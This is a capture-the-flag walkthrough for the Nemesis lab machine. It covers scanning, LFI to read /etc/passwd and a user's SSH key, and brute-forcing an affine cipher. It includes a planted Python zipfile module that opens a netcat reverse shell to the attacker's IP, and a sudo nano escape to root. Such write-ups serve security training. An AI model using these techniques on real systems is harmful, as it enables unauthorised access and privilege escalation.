# IA: Nemesis (1.0.1) Walkthrough

# Description
```bash
Description
Back to the Top
Difficulty: Intermediate to Hard
Goal: Get the root shell and read all the 3 flags.
Information: You need some good encryption and programming skills to root this box. Please solve this challenge by using only the intended way, any unintended way will not be apprecitated.
If you need any hints, you can contact us on Twitter (@infosecarticles)
This works better with VirtualBox rather than VMware. ## Changelog v1.0.1 - 2020-10-25 v1.0.0 - 2020-10-07
```

# Exploitation
Starting with a network scan
```bash
Currently scanning: 192.168.0.124/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   58:11:22:85:0d:41      2     120  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.104   08:00:27:82:2c:06      1      60  PCS Systemtechnik GmbH
```
\
Finding open ports on this machine
```bash
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
52845/tcp open  http    nginx 1.14.2
52846/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
```
\
Now using burpsuite to access port 80 service
\
<img width="1706" height="670" alt="image" src="https://github.com/user-attachments/assets/08e8821d-d736-4087-93c3-2d743b02811a" />
\
Here , as we just slide to next message from admin , we get some credentials
\
<img width="1701" height="754" alt="image" src="https://github.com/user-attachments/assets/1b5e7253-d54f-47c1-900d-212115d6b244" />
\
There was also a sign in page , but when i tried to sign in
\
<img width="1702" height="803" alt="image" src="https://github.com/user-attachments/assets/16c508d6-9b8d-4a54-9ce8-e92a306a33a1" />
\
It sent me to some another html page
\
<img width="1460" height="264" alt="image" src="https://github.com/user-attachments/assets/08f30f02-83c1-4565-afcf-05c2b44b3023" />
\
Then i ran a dirb scan to find robots.txt
```bash
dirb http://192.168.0.104/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr 17 01:01:52 2026
URL_BASE: http://192.168.0.104/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.104/ ----
==> DIRECTORY: http://192.168.0.104/img/                                                                                                                                                                          
+ http://192.168.0.104/index.html (CODE:200|SIZE:20690)                                                                                                                                                           
+ http://192.168.0.104/robots.txt (CODE:200|SIZE:35)                                                                                                                                                              
==> DIRECTORY: http://192.168.0.104/script/                                                                                                                                                                       
+ http://192.168.0.104/server-status (CODE:403|SIZE:278)                                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.104/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.104/script/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Apr 17 01:01:54 2026
DOWNLOADED: 4612 - FOUND: 3
```
\
and it pointed to secret.txt
```bash
User-Agent: *
Disallow: /secret.txt
```
\
WE just get a lot of encoded data
\
<img width="783" height="774" alt="image" src="https://github.com/user-attachments/assets/0a7a3bde-8f52-4ca9-9c0d-3fb3e183e6d0" />
\
And after base64 decoding it , we get a openssh prive key file content
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----
```
\
Tried to ssh , but not usable, so i go onto the next port 
\
<img width="1671" height="744" alt="image" src="https://github.com/user-attachments/assets/21f24ecd-22ff-49d8-a1b9-ac963705072c" />
\
Then i again run dirb on this
```bash
dirb http://192.168.0.104:52845/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr 17 01:09:12 2026
URL_BASE: http://192.168.0.104:52845/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.104:52845/ ----
==> DIRECTORY: http://192.168.0.104:52845/css/                                                                                                                                                                    
==> DIRECTORY: http://192.168.0.104:52845/fonts/                                                                                                                                                                  
==> DIRECTORY: http://192.168.0.104:52845/images/                                                                                                                                                                 
+ http://192.168.0.104:52845/index.php (CODE:200|SIZE:13765)                                                                                                                                                      
==> DIRECTORY: http://192.168.0.104:52845/js/                                                                                                                                                                     
+ http://192.168.0.104:52845/robots.txt (CODE:200|SIZE:35)                                                                                                                                                        
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.104:52845/css/ ----
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.104:52845/fonts/ ----
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.104:52845/images/ ----
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.104:52845/js/ ----
                                                                                                                                                                                                                  
-----------------
END_TIME: Fri Apr 17 01:09:26 2026
DOWNLOADED: 23060 - FOUND: 2
```
\
We get fooled by the robots.txt
\
<img width="476" height="133" alt="image" src="https://github.com/user-attachments/assets/686becd9-7364-448b-bc64-7c48d15299c6" />
\
Then when we scroll down , we see a contact box and i put random data there and we geta  popup
\
<img width="1509" height="564" alt="image" src="https://github.com/user-attachments/assets/d5550395-2c7b-404c-9f7e-4a84b1e2ad9e" />
\
And if we check the page source it says smtg about reading using file://
\
<img width="1125" height="420" alt="image" src="https://github.com/user-attachments/assets/349fdc0e-b891-421a-a36a-43748d90827a" />
\
So i try lfi and i get output on the webpage itself
\
<img width="1693" height="791" alt="image" src="https://github.com/user-attachments/assets/1d50e3a8-c7f3-4926-8669-c92ea75150cd" />
\
From here we can see all the users on the machine
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
carlos:x:1000:1000:Carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
thanos:x:1001:1001:Thanos,,,:/home/thanos:/bin/bas
```
\
So i started looking for a way to get a shell on this box, then i tried checking for private ssh keys of users thanos and carlos
\
And i found 
\
<img width="1261" height="530" alt="image" src="https://github.com/user-attachments/assets/fc5d1a80-27bf-4e9c-a69a-7d42e1a95388" />
\
Guess the previous private ssh file we found was fake since we didnt use it anywhere
```bash
ssh thanos@nemesis.box -p52846 -i thanos-id_rsa       
Linux nemesis 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct  7 18:02:36 2020
thanos@nemesis:~$ id
uid=1001(thanos) gid=1001(thanos) groups=1001(thanos)
thanos@nemesis:~$ ls -la
total 40
drwxr-xr-x 4 thanos thanos 4096 Oct 25  2020 .
drwxr-xr-x 4 root   root   4096 Oct  6  2020 ..
-rw-r--r-- 1 carlos carlos  345 Oct  3  2020 backup.py
-rw------- 1 thanos thanos   72 Oct 25  2020 .bash_history
-rw-r--r-- 1 thanos thanos  220 Oct  6  2020 .bash_logout
-rw-r--r-- 1 thanos thanos 3526 Oct  6  2020 .bashrc
-rw-r--r-- 1 thanos thanos  800 Oct  6  2020 flag1.txt
drwxr-xr-x 3 thanos thanos 4096 Oct  7  2020 .local
-rw-r--r-- 1 thanos thanos  807 Oct  6  2020 .profile
drwxr-xr-x 2 thanos thanos 4096 Oct  7  2020 .ssh
thanos@nemesis:~$ cat flag1.txt 

                          _.-'|
                      _.-'    |
                  _.-'        |
               .-'____________|______
               |                     |
               | Congratulations for |
               |  pwning user Thanos |
               |                     |
               |      _______        |
               |     |.-----.|       |
               |     ||x . x||       |
               |     ||_.-._||       |
               |     `--)-(--`       |
               |    __[=== o]___     |
               |   |:::::::::::|\    |
               |   `-=========-`()   |
               |                     |
               |  Flag{LF1_is_R34L}  |
               |                     |
               |    -= Nemesis =-    |
               `---------------------`

```
\
Now we have successfully logged in as thanos
```bash
thanos@nemesis:~$ cat backup.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/tmp/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```
\
This file is owned by user carlos and it creates a bacukup of the website dir by zipping it
\
I checked the current zip file if it had some useful info , but it did not 
then i transferred linpeas and pspy into target machine and ran pspy to check for cronjobs
and found one
```bash
 11:50:01 CMD: UID=1000  PID=1311   | /bin/sh -c /usr/bin/python /home/thanos/backup.py
```
\
we know that uid 1000 is of user carlos
```bash
carlos:x:1000:1000:Carlos,,,:/home/carlos:/bin/bash
```
\
Since the python script is importing the 'zipfile' library , i first thought of library poisoning , where we try to import a fake library with the same name 
\
So i created a fake file and tried to check which library was being used
```bash
thanos@nemesis:~$ python3 -c "import zipfile; print(zipfile.__file__)"
^C/home/thanos/zipfile.py
```
\
Here we can see that this method works , so i use a basic reverse shell script
```bash
thanos@nemesis:~$ cat zipfile.py 
import os
os.system('busybox nc 192.168.0.124 4444 -e /bin/sh')
```
\
And we get a revshell as carlos , since the process was run by the cronjob of user carlos
```bash
carlos@nemesis:~$ id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
carlos@nemesis:~$ ls -la
total 40
drwxr-x--- 3 carlos carlos 4096 Oct  7  2020 .
drwxr-xr-x 4 root   root   4096 Oct  6  2020 ..
-rw------- 1 carlos carlos    8 Oct 25  2020 .bash_history
-rw-r--r-- 1 carlos carlos  220 Oct  6  2020 .bash_logout
-rw-r--r-- 1 carlos carlos 3526 Oct  6  2020 .bashrc
-rw-r--r-- 1 carlos carlos  886 Oct  5  2020 encrypt.py
-rw-r--r-- 1 carlos carlos  801 Oct  7  2020 flag2.txt
drwxr-xr-x 3 carlos carlos 4096 Oct  7  2020 .local
-rw-r--r-- 1 carlos carlos  807 Oct  6  2020 .profile
-rw-r--r-- 1 carlos carlos  279 Oct  7  2020 root.txt
carlos@nemesis:~$ cat flag2.txt 

                          _.-'|
                      _.-'    |
                  _.-'        |
               .-'____________|______
               |                     |
               | Congratulations for |
               |  pwning user Carlos |
               |                     |
               |      _______        |
               |     |.-----.|       |
               |     ||x . x||       |
               |     ||_.-._||       |
               |     `--)-(--`       |
               |    __[=== o]___     |
               |   |:::::::::::|\    |
               |   `-=========-`()   |
               |                     |
               | Flag{PYTHON_is_FUN} |
               |                     |
               |    -= Nemesis =-    |
               `---------------------`



```
\
We see that there is a cryptographic challenge here
```bash
carlos@nemesis:~$ cat root.txt 
The password for user Carlos has been encrypted using some algorithm and the code used to encrpyt the password is stored in "encrypt.py". You need to find your way to hack the encryption algorithm and get the password. The password format is "************FUN********"
Good Luck!
carlos@nemesis:~$ cat encrypt.py 
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
    gcd = b
    return gcd, x, y

def modinv(a, m):
    gcd, x, y = egcd(a, m)
    if gcd != 1:
        return None
    else:
        return x % m

def affine_encrypt(text, key):
    return ''.join([ chr((( key[0]*(ord(t) - ord('A')) + key[1] ) % 26)
                  + ord('A')) for t in text.upper().replace(' ', '') ])

def affine_decrypt(cipher, key):
    return ''.join([ chr((( modinv(key[0], 26)*(ord(c) - ord('A') - key[1]))
                    % 26) + ord('A')) for c in cipher ])

def main():
    text = 'REDACTED'
    affine_encrypted_text="FAJSRWOXLAXDQZAWNDDVLSU"
    key = [REDACTED,REDACTED]
    print('Decrypted Text: {}'.format
    ( affine_decrypt(affine_encrypted_text, key) ))

if __name__ == '__main__':
    main()

```
\
This is basically an affine cipher with a hint of the plaintext
\
So , we write a script to get the correct plaintext using bruteforce
```bash
import string

def egcd(a, b):
    if a == 0:
        return b, 0, 1
    g, y, x = egcd(b % a, a)
    return g, x - (b // a) * y, y

def modinv(a, m):
    g, x, _ = egcd(a, m)
    if g != 1:
        return None
    return x % m

def affine_decrypt(cipher, a, b):
    inv = modinv(a, 26)
    if inv is None:
        return None
    result = ""
    for c in cipher:
        result += chr(((inv * (ord(c) - ord('A') - b)) % 26) + ord('A'))
    return result

cipher = "FAJSRWOXLAXDQZAWNDDVLSU"

valid_a = [1,3,5,7,9,11,15,17,19,21,23,25]

for a in valid_a:
    for b in range(26):
        text = affine_decrypt(cipher, a, b)
        if text and "FUN" in text:
            print(f"a={a}, b={b} -> {text}")
```
\
And we get 
```bash
python 1.py     
a=11, b=13 -> ENCRYPTIONISFUNPASSWORD

```
\
So now we have password of user carlos and we can check the sudo priviledges
```bash
sudo -l
[sudo] password for carlos: 
Matching Defaults entries for carlos on nemesis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User carlos may run the following commands on nemesis:
    (root) /bin/nano /opt/priv
```
\
After searching online , there was a classic way to get root shell from this 
\
First run 
```bash
sudo -u root /bin/nano /opt/priv
```
\
Then press Ctrl + R 
\
Then Ctrl + X
\
Then type 
```bash
reset; sh 1>&0 2>&0
```
\
<img width="1529" height="98" alt="image" src="https://github.com/user-attachments/assets/8a97f22e-5905-4218-b002-1379397746d2" />
\
Now , we have a root shell inside nano , lets convert into normal shell using busybox
```bash
root@nemesis:/home/carlos# id
uid=0(root) gid=0(root) groups=0(root)
root@nemesis:/home/carlos# cd /root
root@nemesis:~# ls -la
total 24
drwx------  3 root root 4096 Oct 25  2020 .
drwxr-xr-x 18 root root 4096 Oct  6  2020 ..
-rw-------  1 root root    0 Oct 25  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Oct  6  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root 1198 Oct  7  2020 root.txt
root@nemesis:~# cat root.txt 

             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I LOVE Linux!  |  |  |     |         |      |
     |  |                 |  |  |/----|`---=    |      |
     |  | root@nemesis:~# |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"    
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'

FLAG{CTFs_ARE_AW3S0M3}

Congratulations for getting root on Nemesis! We hope you enjoyed this CTF!

Share this Flag on Twitter (@infosecarticles). Cheers!

Follow our blog at https://www.infosecarticles.com

Made by CyberBot and 0xMadhav!
```
\
The end , thank you for reading till here
